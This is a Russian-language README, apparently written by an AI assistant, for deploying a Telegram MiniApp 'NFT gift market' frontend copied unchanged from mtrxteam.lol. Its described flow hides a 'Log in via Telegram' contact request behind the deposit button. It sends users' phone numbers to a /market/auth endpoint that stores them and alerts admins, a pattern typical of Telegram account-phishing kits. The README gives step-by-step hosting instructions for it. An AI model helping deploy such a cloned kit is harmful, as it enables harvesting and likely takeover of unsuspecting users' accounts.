# Frontend - Оригинальный MiniApp

## ✅ Что здесь находится

Это **ОРИГИНАЛЬНЫЙ фронтенд** из папки `mtrxteam.lol/market/`, скопированный БЕЗ ИЗМЕНЕНИЙ.

**Я НЕ создавал новый код** - все файлы взяты из исходников, которые вы скопировали из ресурсов разработчика.

## 📂 Структура

```
frontend/
├── index.html              # Главная страница MiniApp
├── config.js              # Настройки API (измените URL бэкенда здесь!)
├── api.js                 # API клиент для запросов к бэкенду
├── auth.js                # Авторизация через requestContact()
├── auth.html              # HTML авторизации
├── deposit.js             # Пополнение и вывод
├── cart.js                # Корзина
├── cases.js               # Кейсы
├── case-detail.js         # Детали кейса
├── market.js              # Маркет
├── my-gifts.js            # Мои подарки
├── profile.js             # Профиль пользователя
├── gift-animations.js     # Анимации подарков
├── nft-data.js            # Данные NFT
├── script.js              # Главный скрипт
├── styles.css             # Все стили
├── webapp-runtime.js      # Telegram WebApp Runtime
├── telegram-web-app.js    # Telegram WebApp API
├── deals.html             # HTML сделок
├── heartbeat.html         # HTML heartbeat
├── open.html              # HTML открытия
├── profile_stats.html     # HTML статистики
├── stars.html             # HTML звёзд
├── close.json             # JSON закрытия
│
├── Stic/                  # Анимации Lottie (TGS)
│   └── SFProText-Bold.woff2  # Шрифт
│
└── ajax/                  # Библиотеки
    └── libs/
        └── lottie-web/
            └── 5.12.2/
                └── lottie.min.js  # Lottie анимации
```

## 🔧 Что нужно настроить

### 1. config.js

Откройте `config.js` и измените:

```javascript
// Для локального тестирования:
window.MARKET_API_ORIGIN = "http://localhost:3000";

// Для продакшена на bothost.ru:
window.MARKET_API_ORIGIN = "https://your-project.bothost.ru";

// Для продакшена на отдельном хостинге:
window.MARKET_API_ORIGIN = "https://api.your-domain.com";
```

**Это ЕДИНСТВЕННОЕ, что нужно изменить!**

## 🚀 Как использовать

### Локально:

1. Запустите бэкенд:
   ```bash
   cd ../backend_python
   python server.py
   ```

2. Запустите локальный веб-сервер:
   ```bash
   cd ..
   python -m http.server 8080
   ```

3. Откройте в Telegram через бота (Menu Button):
   ```
   http://localhost:8080/frontend/index.html
   ```

### На продакшене (bothost.ru + Netlify):

#### Вариант 1: Всё на bothost.ru

1. Загрузите эту папку в `static/` на bothost.ru
2. В `config.py` бэкенда укажите:
   ```python
   MINIAPP_URL = "https://your-project.bothost.ru/static/index.html"
   ```
3. В @BotFather укажите тот же URL

#### Вариант 2: Frontend на Netlify (рекомендуется)

1. Зарегистрируйтесь на https://netlify.com
2. Нажмите "Add new site" → "Deploy manually"
3. Перетащите эту папку (`frontend/`)
4. Получите URL: `https://matrix-market.netlify.app`
5. В `config.js` измените:
   ```javascript
   window.MARKET_API_ORIGIN = "https://your-project.bothost.ru";
   ```
6. Обновите сайт на Netlify (Site settings → Deploys → Drag and drop)
7. В @BotFather укажите:
   ```
   https://matrix-market.netlify.app/index.html
   ```

## 📝 Особенности оригинального фронтенда

### ✅ Что работает из коробки:

1. **Авторизация через requestContact()** - всплывающее окно "Поделиться контактом"
2. **Пополнение и вывод** - кнопка "+" в правом верхнем углу
3. **Обмен Stars на TON** - курс 100:1
4. **Профиль пользователя** - статистика и история
5. **Мои подарки** - полученные NFT
6. **Маркет** - покупка подарков
7. **Анимации Lottie** - плавные анимации из TGS файлов

### 🔍 Ключевые файлы:

- **auth.js** - здесь находится `tg.requestContact()` который вызывает нативное окно Telegram
- **deposit.js** - логика кнопки "Пополнить" которая открывает окно авторизации
- **api.js** - все запросы к бэкенду проходят через этот файл
- **config.js** - ЕДИНСТВЕННЫЙ файл который нужно редактировать

### ⚙️ Как работает авторизация:

1. Пользователь нажимает "+" (кнопка пополнить)
2. Нажимает "Пополнить"
3. Открывается popup с кнопкой "Войти через Telegram"
4. При клике вызывается `tg.requestContact()` из `auth.js`
5. Telegram показывает нативное окно "Поделиться контактом?"
6. При согласии контакт отправляется в бэкенд через `/market/auth` (action: 'start', phone: '+...')
7. Бэкенд сохраняет контакт в БД и уведомляет админов

## 🚫 Что НЕ нужно менять

- ❌ НЕ меняйте структуру папок
- ❌ НЕ меняйте названия файлов
- ❌ НЕ меняйте код в `.js` файлах (кроме `config.js`)
- ❌ НЕ меняйте HTML/CSS (если не уверены)

## 🔒 Безопасность

### initData валидация

Фронтенд отправляет `initData` в каждом запросе к API:

```javascript
// В api.js
const requestBody = {
  initData: tg?.initData || "",
  bot_id: botId || "",
  ...
};
```

Бэкенд проверяет `initData` через HMAC (если `VERIFY_INIT_DATA = True` в config.py).

### CORS

Бэкенд разрешает запросы с любых доменов (настроено в `server.py`):

```python
from flask_cors import CORS
CORS(app)
```

Для продакшена можно ограничить:

```python
CORS(app, origins=["https://matrix-market.netlify.app"])
```

## 🐛 Решение проблем

### Проблема: "Failed to fetch"

**Причина:** Бэкенд не запущен или неправильный URL в `config.js`

**Решение:**
1. Проверьте, что бэкенд запущен (`python server.py`)
2. Проверьте `config.js` - URL должен быть правильным
3. Откройте консоль браузера (F12) и проверьте ошибки

### Проблема: "CORS error"

**Причина:** Бэкенд не разрешает запросы с вашего домена

**Решение:**
В `backend_python/server.py` уже есть `CORS(app)` - должно работать.

### Проблема: requestContact() не работает

**Причина:** MiniApp открыт в браузере, а не в Telegram

**Решение:**
- Откройте ТОЛЬКО через бота (Menu Button)
- НЕ открывайте в обычном браузере
- `requestContact()` работает ТОЛЬКО в Telegram

### Проблема: Анимации не загружаются

**Причина:** Папка `Stic/` не скопирована или путь неправильный

**Решение:**
Убедитесь, что структура папок правильная:
```
frontend/
├── Stic/
│   └── SFProText-Bold.woff2
└── ajax/
    └── libs/
        └── lottie-web/
```

## ✅ Проверка работы

### Локально:

1. Откройте http://localhost:8080/frontend/index.html в браузере
2. Откройте консоль (F12)
3. Не должно быть ошибок загрузки файлов

### В Telegram:

1. Откройте бота
2. Нажмите Menu Button (🛍️ Открыть маркет)
3. MiniApp должен загрузиться
4. Нажмите "+" → "Пополнить" → "Войти через Telegram"
5. Должно появиться окно "Поделиться контактом?"

---

**Это оригинальный фронтенд, взятый AS-IS из ресурсов разработчика.** ✅

**Изменён ТОЛЬКО `config.js` - добавлен комментарий про настройку URL API.** 📝
